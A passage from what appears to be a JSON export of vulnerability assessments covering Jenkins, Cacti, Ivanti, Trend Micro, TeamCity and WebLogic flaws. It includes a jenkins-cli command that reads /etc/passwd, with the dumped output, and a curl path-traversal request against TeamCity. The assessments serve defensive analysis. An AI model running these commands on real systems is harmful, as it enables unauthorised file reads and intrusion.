\r\n\r\n```\r\nroot:x:0:0:root:/root:/bin/bash\r\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\r\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\r\n```\r\n\r\nIf an attacker has an account with `Overall/Read` permission on the target Jenkins system, the entire contents of a text file can be read, via the CLI command `connect-node`,  as shown below:\r\n\r\n**Note: When leveraging the CLI command `connect-node`, the returned lines of text are displayed out of order to that of the original file.**\r\n\r\n```\r\n$ java -jar jenkins-cli.jar -auth admin:qwerty12345 -s http://192.168.86.70:8080 connect-node @/etc/passwd\r\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin: No such agent \"www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\" exists.\r\nroot:x:0:0:root:/root:/bin/bash: No such agent \"root:x:0:0:root:/root:/bin/bash\" exists.\r\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin: No such agent \"mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\" exists.\r\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin: No such agent \"backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\" exists.\r\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin: No such agent \"_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\" exists.\r\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin: No such agent \"nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\" exists.\r\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin: No such agent \"lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\" exists.\r\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin: No such agent \"uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\" exists.\r\nbin:x:2:2:bin:/bin:/usr/sbin/nologin: No such agent \"bin:x:2:2:bin:/bin:/usr/sbin/nologin\" exists.\r\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin: No such agent \"news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\" exists.\r\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin: No such agent \"proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\" exists.\r\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin: No such agent \"irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\" exists.\r\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin: No such agent \"list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\" exists.\r\njenkins:x:1000:1000::/var/jenkins_home:/bin/bash: No such agent \"jenkins:x:1000:1000::/var/jenkins_home:/bin/bash\" exists.\r\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin: No such agent \"games:x:5:60:games:/usr/games:/usr/sbin/nologin\" exists.\r\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin: No such agent \"man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\" exists.\r\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin: No such agent \"daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\" exists.\r\nsys:x:3:3:sys:/dev:/usr/sbin/nologin: No such agent \"sys:x:3:3:sys:/dev:/usr/sbin/nologin\" exists.\r\nsync:x:4:65534:sync:/bin:/bin/sync: No such agent \"sync:x:4:65534:sync:/bin:/bin/sync\" exists.\r\n\r\nERROR: Error occurred while performing this command, see previous stderr output.\r\n```\r\n\r\nThe issue is complicated further if the attacker wants to read a binary file, as the target systems string encoding method may remove unsupported bytes in the string output. As noted in the original vendor advisory, Linux will use UTF-8 by default which may remove as much as 50% of all encoded characters, while Windows uses Windows-1252 which will remove only 5 out of the 256 possible byte values being returned.\r\n\r\nThe vendor advisory gives several examples of how to leverage this vulnerability to achieve something (such as RCE), but they all require the ability to successfully read a binary file. While not impossible, in may scenarios it may not be practical for an attacker to achieve this. The Horizion3ai blog also has some good detail on these constraints too.\r\n\r\nWe can summarize the constraints an attacker will face when exploiting this vulnerability with the following table:\r\n\r\nNote, \"Authenticated\" in this context means an attacker has privileges on the Jenkins system with the `Overall/Read` permission.\r\n\r\n| Attacker Privileges | File Type | Target Platform | Impact |\r\n| --- | --- | --- | --- |\r\n| Unauthenticated | Text | Linux | Can read the first 3 lines of any text file |\r\n| Unauthenticated | Text | Windows | Can read the first 3 lines of any text file |\r\n| Unauthenticated | Binary | Linux | Can read some contents, the target platform character encoding is likely UTF-8, so half of the 256 possible bytes will be returned with an incorrect value, making recovery of the original file unlikely |\r\n| Unauthenticated | Binary | Windows | Can read some contents, the target platform character encoding is likely Windows-1252, so only 5 of the 256 possible bytes will be returned with an incorrect value, making recovery of the original more likely than the Linux counterpart |\r\n| Authenticated | Text | Linux | Can read the entire contents of any text file |\r\n| Authenticated | Text | Windows | Can read the entire contents of any text file |\r\n| Authenticated | Binary | Linux | Can read the entire contents of any file, the target platform character encoding is likely UTF-8, so half of the 256 possible bytes will be returned with an incorrect value, making recovery of the original file unlikely |\r\n| Authenticated | Binary | Windows | Can read the entire contents of any file, the target platform character encoding is likely Windows-1252, so only 5 of the 256 possible bytes will be returned with an incorrect value, making recovery of the original more likely than the Linux counterpart |\r\n\r\nIt is currently unknown if an unauthenticated attacker can compromise a Jenkins system by only reading the first 3 lines of a text file via this vulnerability.",
      "score": 2,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "fe0d1818-0a18-43ab-ba43-dd29e2dd7d15",
      "editorId": "e28f53e6-cf6f-4b91-89be-6cb19dfd4315",
      "topicId": "8fe8c305-3ec3-4279-b07b-0f7b7135616f",
      "created": "2024-02-01T11:36:32.125174Z",
      "revisionDate": "2024-02-01T11:36:32.124338Z",
      "document": "CISA",
      "score": 1,
      "metadata": {},
      "tags": [
        {
          "id": "19076e68-1c52-48c1-bc15-7f6a3053c357",
          "name": "CISA KEV Listed",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "cisa_kev_listed"
        }
      ]
    },
    {
      "id": "d255b582-0e80-4b5c-8a08-dd0f4697a64e",
      "editorId": "b68e9cb9-1bd0-4339-abe7-329618ce2467",
      "topicId": "38309956-f678-44ea-84ec-d65f8801c4ce",
      "created": "2024-02-01T13:02:05.27377Z",
      "revisionDate": "2024-02-01T15:57:04.613922Z",
      "document": "This is a [blind SQL injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection) in the poller device management page (`pollers.php`), which can be exploited with time-based techniques. Even if the exploitation is a bit more complex, the attacker can have full control of the database and can read, update, insert and delete anything. For example, the `user_auth_realm` table can be updated to grant administrative privileges. Also, it is possible to chain this vulnerability with [CVE-2023-49084](https://attackerkb.com/topics/CcccHqX1Qs/cve-2023-49084) and get remote code execution. A Metasploit [module](https://github.com/rapid7/metasploit-framework/pull/18769) exists for this.\r\n\r\nThe risk is reduced because the attacker needs to be authenticated with permissions to access the `pollers` page. This is granted by setting the `Sites/Devices/Data` permission in the `General Administration` section. That being said, even if Cacti is usually not exposed to the internet, it is a serious issue and should be patched as soon as possible. A [fix](https://github.com/Cacti/cacti/commit/c7c91bf4bdb87769351782b61cda6d89e8e82343) has been released with version [1.2.26](https://github.com/Cacti/cacti/releases/tag/release%2F1.2.26).",
      "score": 2,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "0e696d6d-665a-48bd-9636-06d0a3a2a211",
          "name": "Requires elevated access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_elevated_access"
        }
      ]
    },
    {
      "id": "35aa86fa-7444-4782-8f60-458cbc3df7c2",
      "editorId": "b68e9cb9-1bd0-4339-abe7-329618ce2467",
      "topicId": "8a5440bd-e85c-4c1a-88e5-8de7809dc60b",
      "created": "2024-02-01T13:03:48.72968Z",
      "revisionDate": "2024-02-01T13:03:48.728951Z",
      "document": "This is a local file inclusion vulnerability that affects the external links page `link.php`. When chained with [CVE-2023-49084](https://attackerkb.com/topics/Hhok3V8sLU/cve-2023-49085), a SQL injection vulnerability in the `pollers.php` script, an attacker can achieve remote code execution. It requires to be authenticated with specific permissions to exploit the SQL injection, but if these conditions are met, an attacker can update the database and exploit this vulnerability.\r\n\r\nThe attack consists in creating an external link entry in the database that points to the Cacti log file and setting all the permissions needed to access it. Then, the attacker just has to [inject](https://owasp.org/www-community/attacks/Log_Injection) a stager payload the logs, which will be triggered when the external link page is requested. A Metasploit [module](https://github.com/rapid7/metasploit-framework/pull/18769) exists for this.\r\n\r\nSince this vulnerability requires an user account setup with specific permissions, the risk is lowered. However, remote code execution is still considered a serious issue and should be patched as soon as possible. A [fix](https://github.com/Cacti/cacti/commit/c7c91bf4bdb87769351782b61cda6d89e8e82343) has been released with version [1.2.26](https://github.com/Cacti/cacti/releases/tag/release%2F1.2.26).\r\n",
      "score": 1,
      "metadata": {},
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "0e696d6d-665a-48bd-9636-06d0a3a2a211",
          "name": "Requires elevated access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_elevated_access"
        }
      ]
    },
    {
      "id": "66090ad3-38c1-4761-b482-52152fd36790",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "4f92b26a-6c79-4b43-af83-cf55bd30dbb4",
      "created": "2024-02-02T20:19:41.580109Z",
      "revisionDate": "2024-02-03T09:03:47.44715Z",
      "document": "See the [Rapid7 analysis](https://attackerkb.com/topics/FGlK1TVnB2/cve-2024-21893/rapid7-analysis) for details on the exploit chain.",
      "score": 4,
      "metadata": {
        "attacker-value": 5
      },
      "tags": [
        {
          "id": "19076e68-1c52-48c1-bc15-7f6a3053c357",
          "name": "CISA KEV Listed",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "cisa_kev_listed"
        },
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "fde87f20-64d4-4e1c-a272-106f3b74a629",
      "editorId": "e60bb087-dc0a-4598-a4f3-16c0894a8fc2",
      "topicId": "9fa7e30e-a1a3-4990-8a8f-65c74912f4b7",
      "created": "2024-02-04T08:36:15.343502Z",
      "revisionDate": "2024-02-04T08:36:15.342984Z",
      "document": "",
      "score": 1,
      "metadata": {
        "attacker-value": 1
      },
      "tags": [
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "e3572615-0a93-4e5b-a181-432316d5c6d3",
      "editorId": "e28f53e6-cf6f-4b91-89be-6cb19dfd4315",
      "topicId": "6c5ebc66-5f3c-4b4b-8986-07b2301785f5",
      "created": "2024-02-09T15:26:53.874665Z",
      "revisionDate": "2024-02-09T15:31:06.288273Z",
      "document": "An HTTP POST request towards /dana-na/auth/saml-sso.cgi using the SAMLRequest as the vehicle with a base64 decoded XXE payload works and is already observed being abused in the wild.",
      "score": 1,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "3de957ef-5820-4be5-ae16-3102d27f3df9",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "ed2bb182-dc50-4d23-b9d2-d279f276d1c9",
      "created": "2024-02-11T18:38:31.065459Z",
      "revisionDate": "2024-02-13T21:36:12.159081Z",
      "document": "This was [disclosed as 0day](https://success.trendmicro.com/dcx/s/solution/000294994?language=en_US) in September 2023 and then kind of never spoken of again, true to form for Trend Micro product 0days ([exhibit 1](https://success.trendmicro.com/dcx/s/solution/000291528?language=en_US), [exhibit 2](https://www.zdnet.com/article/two-trend-micro-zero-days-exploited-in-the-wild-by-hackers/), [exhibit 3](https://success.trendmicro.com/dcx/s/solution/000151730-SECURITY-BULLETIN-Trend-Micro-OfficeScan-Arbitrary-File-Upload-with-Directory-Traversal-Vulnerability?language=en_US)). For CVE-2023-41179, exploitation requires an attacker to have admin console access on the target system, hence the low exploitability rating. As usual with these things, there don't appear to be any public details. ",
      "score": 2,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "19076e68-1c52-48c1-bc15-7f6a3053c357",
          "name": "CISA KEV Listed",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "cisa_kev_listed"
        },
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        },
        {
          "id": "0e696d6d-665a-48bd-9636-06d0a3a2a211",
          "name": "Requires elevated access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_elevated_access"
        }
      ]
    },
    {
      "id": "25397f72-670e-4ef4-a19b-2a3a55120d18",
      "editorId": "d603b493-1c7b-4ee8-972f-185269cce6d3",
      "topicId": "badc92f0-956d-4757-a484-45fc0a6614ce",
      "created": "2024-02-12T17:26:03.821479Z",
      "revisionDate": "2024-02-13T12:26:55.385622Z",
      "document": "CVE-2024-24942 is described by the vendor:\r\n> Path traversal allowed reading data within JAR archives. \r\n\r\nIf we decompile and diff the REST API from TeamCity 2023.11.2 (`C:\\TeamCity\\webapps\\ROOT\\WEB-INF\\plugins\\rest-api\\server\\rest-api-2023.09-147486.jar`) against TeamCity 2023.11.3 (`C:\\TeamCity\\webapps\\ROOT\\WEB-INF\\plugins\\rest-api\\server\\rest-api-2023.09-147512.jar`), we can see the `SwaggerUI` class has been modified.\r\n\r\nAnd reading the below diff, if appears this issue lies in an attacker being able to supply an arbitrary path when getting swagger resources from an unauthenticated endpoint.\r\n\r\n```diff\r\n--- \"a/C:\\\\Users\\\\Administrator\\\\Desktop\\\\Decomp_2023.11.2_restapi\\\\jetbrains\\\\buildServer\\\\server\\\\rest\\\\swagger\\\\SwaggerUI.java\"\r\n+++ \"b/C:\\\\Users\\\\Administrator\\\\Desktop\\\\Decomp_2023.11.3_restapi\\\\jetbrains\\\\buildServer\\\\server\\\\rest\\\\swagger\\\\SwaggerUI.java\"\r\n@@ -26,7 +26,7 @@ import javax.ws.rs.PathParam;\r\n import javax.ws.rs.Produces;\r\n import javax.ws.rs.core.Context;\r\n import javax.ws.rs.core.UriInfo;\r\n-import jetbrains.buildServer.server.rest.SwaggerUIUtil;\r\n+import jetbrains.buildServer.server.rest.swagger.SwaggerUtil;\r\n\r\n @Path(value=\"/app/rest/swaggerui\")\r\n @Api(hidden=true)\r\n@@ -42,7 +42,7 @@ public class SwaggerUI {\r\n     @GET\r\n     @Produces(value={\"text/html\"})\r\n     public String serveSwaggerUI() {\r\n-        try (InputStream input = SwaggerUIUtil.getFileFromResources(\"index.html\");){\r\n+        try (InputStream input = SwaggerUtil.getFileFromResources(\"index.html\");){\r\n             String string = StreamUtil.readText((InputStream)input, (String)\"UTF-8\");\r\n             return string;\r\n         }\r\n@@ -62,7 +62,7 @@ public class SwaggerUI {\r\n         if (path.equals(\"index.html\")) {\r\n             return this.serveSwaggerUI();\r\n         }\r\n-        try (InputStream input = SwaggerUIUtil.getFileFromResources(path);){\r\n+        try (InputStream input = SwaggerUtil.getFileFromResources(path);){\r\n             if (path.endsWith(\".js\") || path.endsWith(\".css\")) {\r\n                 String string = StreamUtil.readText((InputStream)input, (String)\"UTF-8\");\r\n                 return string;\r\n```\r\n\r\nWe can see in the patched code, that `SwaggerUIUtil.getFileFromResources` calls a helper method `isValidResourcePath`. This helper method will detect the presence of double dot notation in a path, and cause an exception to be thrown, preventing the use of double dot notation during `SwaggerUtil.class.getClassLoader().getResourceAsStream`.\r\n\r\n```diff\r\n--- \"a/C:\\\\Users\\\\Administrator\\\\Desktop\\\\Decomp_2023.11.2_restapi\\\\jetbrains\\\\buildServer\\\\server\\\\rest\\\\SwaggerUIUtil.java\"\r\n+++ \"b/C:\\\\Users\\\\Administrator\\\\Desktop\\\\Decomp_2023.11.3_restapi\\\\jetbrains\\\\buildServer\\\\server\\\\rest\\\\swagger\\\\SwaggerUtil.java\"\r\n@@ -1,24 +1,245 @@\r\n /*\r\n  * Decompiled with CFR 0.152.\r\n+ *\r\n+ * Could not load the following classes:\r\n+ *  com.intellij.openapi.diagnostic.Logger\r\n+ *  io.swagger.models.Model\r\n+ *  io.swagger.models.Operation\r\n+ *  io.swagger.models.Path\r\n+ *  io.swagger.models.RefModel\r\n+ *  io.swagger.models.Response\r\n+ *  io.swagger.models.Swagger\r\n+ *  io.swagger.models.parameters.BodyParameter\r\n+ *  io.swagger.models.properties.ArrayProperty\r\n+ *  io.swagger.models.properties.MapProperty\r\n+ *  io.swagger.models.properties.Property\r\n+ *  io.swagger.models.properties.RefProperty\r\n+ *  org.jetbrains.annotations.NotNull\r\n  */\r\n-package jetbrains.buildServer.server.rest;\r\n+package jetbrains.buildServer.server.rest.swagger;\r\n\r\n+import com.intellij.openapi.diagnostic.Logger;\r\n+import io.swagger.models.Model;\r\n+import io.swagger.models.Operation;\r\n+import io.swagger.models.Path;\r\n+import io.swagger.models.RefModel;\r\n+import io.swagger.models.Response;\r\n+import io.swagger.models.Swagger;\r\n+import io.swagger.models.parameters.BodyParameter;\r\n+import io.swagger.models.properties.ArrayProperty;\r\n+import io.swagger.models.properties.MapProperty;\r\n+import io.swagger.models.properties.Property;\r\n+import io.swagger.models.properties.RefProperty;\r\n import java.io.InputStream;\r\n-import java.net.URL;\r\n+import java.util.ArrayDeque;\r\n+import java.util.ArrayList;\r\n+import java.util.Collections;\r\n+import java.util.HashSet;\r\n+import java.util.LinkedHashMap;\r\n+import java.util.LinkedHashSet;\r\n+import java.util.List;\r\n+import java.util.Map;\r\n+import java.util.Objects;\r\n+import org.jetbrains.annotations.NotNull;\r\n\r\n-public class SwaggerUIUtil {\r\n+public class SwaggerUtil {\r\n+    private static final Logger LOG = Logger.getInstance((String)SwaggerUtil.class.getName());\r\n     public static final String INDEX = \"index.html\";\r\n-    public static final String RESOURCE_PATH = \"swagger/\";\r\n+    private static final String RESOURCE_PATH = \"swagger/\";\r\n\r\n-    public static InputStream getFileFromResources(String path) {\r\n-        String fullPath = RESOURCE_PATH + path;\r\n-        ClassLoader classLoader = SwaggerUIUtil.class.getClassLoader();\r\n-        URL resource = classLoader.getResource(fullPath);\r\n-        if (resource == null) {\r\n+    static void doAnalyzeSwaggerDefinitionReferences(Swagger swagger) {\r\n+        HashSet<String> usedReferences = new HashSet<String>();\r\n+        for (Path path : swagger.getPaths().values()) {\r\n+            for (Operation operation : path.getOperations()) {\r\n+                String ref;\r\n+                Model schema;\r\n+                Object parameter2;\r\n+                List parameters = operation.getParameters();\r\n+                for (Object parameter2 : parameters) {\r\n+                    BodyParameter bp;\r\n+                    if (!(parameter2 instanceof BodyParameter) || !((schema = (bp = (BodyParameter)parameter2).getSchema()) instanceof RefModel)) continue;\r\n+                    RefModel rm = (RefModel)schema;\r\n+                    ref = rm.getSimpleRef();\r\n+                    usedReferences.add(ref);\r\n+                }\r\n+                Map responses = operation.getResponses();\r\n+                parameter2 = responses.values().iterator();\r\n+                while (parameter2.hasNext()) {\r\n+                    Response response = (Response)parameter2.next();\r\n+                    schema = response.getSchema();\r\n+                    if (!(schema instanceof RefProperty)) continue;\r\n+                    RefProperty rp = (RefProperty)schema;\r\n+                    ref = rp.getSimpleRef();\r\n+                    usedReferences.add(ref);\r\n+                }\r\n+            }\r\n+        }\r\n+        Map definitions = swagger.getDefinitions();\r\n+        ArrayDeque<String> queue = new ArrayDeque<String>();\r\n+        queue.addAll(usedReferences);\r\n+        while (!queue.isEmpty()) {\r\n+            String name = (String)queue.pop();\r\n+            Model model = (Model)definitions.get(name);\r\n+            if (model == null) {\r\n+                LOG.warn(\"Swagger definition '\" + name + \"' referenced but not found.\");\r\n+                continue;\r\n+            }\r\n+            Map properties = model.getProperties();\r\n+            if (properties == null) continue;\r\n+            for (Property property : properties.values()) {\r\n+                String ref = SwaggerUtil.getPropertySimpleRef(property);\r\n+                if (ref == null || !usedReferences.add(ref)) continue;\r\n+                queue.add(ref);\r\n+            }\r\n+        }\r\n+        int used = usedReferences.size();\r\n+        int total = definitions.size();\r\n+        LOG.info(\"Swagger definitions stats: Total=\" + total + \" Used=\" + used);\r\n+        if (used != total) {\r\n+            LinkedHashSet unused = new LinkedHashSet(definitions.keySet());\r\n+            unused.removeAll(usedReferences);\r\n+            if (unused.size() > 30) {\r\n+                LOG.warn(\"Too much unused definitions. Enable debug logs to see them\");\r\n+                LOG.debug(\"Unused definitions: \" + unused);\r\n+            } else {\r\n+                LOG.info(\"Unused definitions: \" + unused);\r\n+            }\r\n+        }\r\n+    }\r\n+\r\n+    static <K extends Comparable<? super K>, V> Map<K, V> getOrderedMap(Map<K, V> input) {\r\n+        if (input == null) {\r\n+            return null;\r\n+        }\r\n+        LinkedHashMap<Comparable, V> sorted = new LinkedHashMap<Comparable, V>();\r\n+        ArrayList<K> keys = new ArrayList<K>();\r\n+        keys.addAll(input.keySet());\r\n+        Collections.sort(keys);\r\n+        for (Comparable key : keys) {\r\n+            sorted.put(key, input.get(key));\r\n+        }\r\n+        return sorted;\r\n+    }\r\n+\r\n+    private static String getPropertySimpleRef(Property property) {\r\n+        if (property instanceof RefProperty) {\r\n+            RefProperty rp = (RefProperty)property;\r\n+            return rp.getSimpleRef();\r\n+        }\r\n+        if (property instanceof ArrayProperty) {\r\n+            ArrayProperty ap = (ArrayProperty)property;\r\n+            Property items = ap.getItems();\r\n+            return SwaggerUtil.getPropertySimpleRef(items);\r\n+        }\r\n+        if (property instanceof MapProperty) {\r\n+            MapProperty mp = (MapProperty)property;\r\n+            Property items = mp.getAdditionalProperties();\r\n+            return SwaggerUtil.getPropertySimpleRef(items);\r\n+        }\r\n+        return null;\r\n+    }\r\n+\r\n+    @NotNull\r\n+    public static InputStream getFileFromResources(@NotNull String path) {\r\n+        String fullPath;\r\n+        if (path == null) {\r\n+            SwaggerUtil.$$$reportNull$$$0(0);\r\n+        }\r\n+        if (!SwaggerUtil.isValidResourcePath(fullPath = RESOURCE_PATH + path)) {\r\n             throw new IllegalArgumentException(String.format(\"File %s was not found\", fullPath));\r\n         }\r\n-        InputStream stream = classLoader.getResourceAsStream(fullPath);\r\n-        return stream;\r\n+        InputStream inputStream = Objects.requireNonNull(SwaggerUtil.class.getClassLoader().getResourceAsStream(fullPath));\r\n+        if (inputStream == null) {\r\n+            SwaggerUtil.$$$reportNull$$$0(1);\r\n+        }\r\n+        return inputStream;\r\n+    }\r\n+\r\n+    private static boolean isValidResourcePath(@NotNull String path) {\r\n+        if (path == null) {\r\n+            SwaggerUtil.$$$reportNull$$$0(2);\r\n+        }\r\n+        return !path.contains(\"..\") && SwaggerUtil.class.getClassLoader().getResource(path) != null;\r\n+    }\r\n+\r\n```\r\nWe can reach this via an unauthenticated HTTP(S) GET request to the endpoint `/app/rest/swaggerui`, and provide an arbitrary path parameter, delineated via a semicolon character, e.g. `;/../schema.graphqls`. The below curl request will hit the target endpoint.\r\n\r\n`curl -ik --path-as-is http://172.29.236.183:8111/app/rest/swaggerui;/../schema.graphqls`\r\n\r\nIn a debugger, we can see the request being processed by a vulnerable TeamCity 2023.11.2 server.\r\n\r\n![stack1.png](https://github.com/sfewer-r7/akb_assets/blob/main/CVE-2024-24942/stack1.png?raw=true)\r\n\r\nHowever we were unable to successfully read a file by using double dot notation.\r\n\r\n```\r\n>curl -ik --path-as-is http://172.29.236.183:8111/app/rest/swaggerui;/../schema.graphqls\r\nHTTP/1.1 500\r\nTeamCity-Node-Id: MAIN_SERVER\r\nCache-Control: no-store\r\nContent-Type: text/plain\r\nTransfer-Encoding: chunked\r\nDate: Mon, 12 Feb 2024 17:13:15 GMT\r\nConnection: close\r\n\r\nError has occurred during request processing, status code: 500 (Internal Server Error).\r\nDetails: java.lang.IllegalArgumentException: File swagger/../schema.graphqls was not found\r\nError occurred while processing this request.\r\n```\r\n\r\nAs such, I have tagged this as `Difficult to weaponize` and given an attacker value rating of very low. I marked Exploitability as very high, as you can reach the vulnerable code via a single unauthenticated HTTP(S) request.",
      "score": 2,
      "metadata": {
        "attacker-value": 1,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "c741fce5-764f-4c32-a646-1fb167423e6d",
      "editorId": "de2686f1-1a8a-4518-8379-12188d859523",
      "topicId": "a92eb5d4-1ff3-428d-b8b0-d7d483e0c871",
      "created": "2024-02-12T18:06:34.65021Z",
      "revisionDate": "2024-02-19T13:27:34.932456Z",
      "document": "\r\n\r\n### CVE-2023-21839\r\n\r\nIn early 2023 a vulnerability was found in the Oracle WebLogic IIOP/T3 protocol. When the IIOP/T3 protocol is enabled, unauthenticated attackers are able to execute arbitrary commands on the system. The vulnerability\u2019s sink point was the following class `weblogic.deployment.jms.ForeignOpaqueReference.class` which contains a function `getReferent` which calls the following code: \r\n```\r\ntry {\r\n\tvar5 = var4.lookup(this.remoteJNDIName);\r\n}\r\n```\r\n\r\nThis allows the attacker to initiate a JNDI injection attack by hosting malicious code on their own JNDI server to be downloaded and run by WebLogic. However, due to mitigations put in place by Java this JNDI injection technique used by the exploit is only exploitable on WebLogic Server running older versions of Java. \r\n\r\nIn the last few years Oracle has applied several restrictions that aimed to prevent attackers from exploiting JNDI Injection vulnerabilities. One example of such restriction is the `trustURLCodebase` property which was introduced in Java Development Kit 8 \u2013 Update 121. This property prevents vulnerable applications from loading malicious objects from remote RMI repositories. Later, a similar restriction was added also to cover LDAP repositories.\r\n\r\nSince those restrictions were added, exploiting JNDI Injection vulnerabilities now depends on existing gadgets, which means the classes used in the exploit must reside in the vulnerable 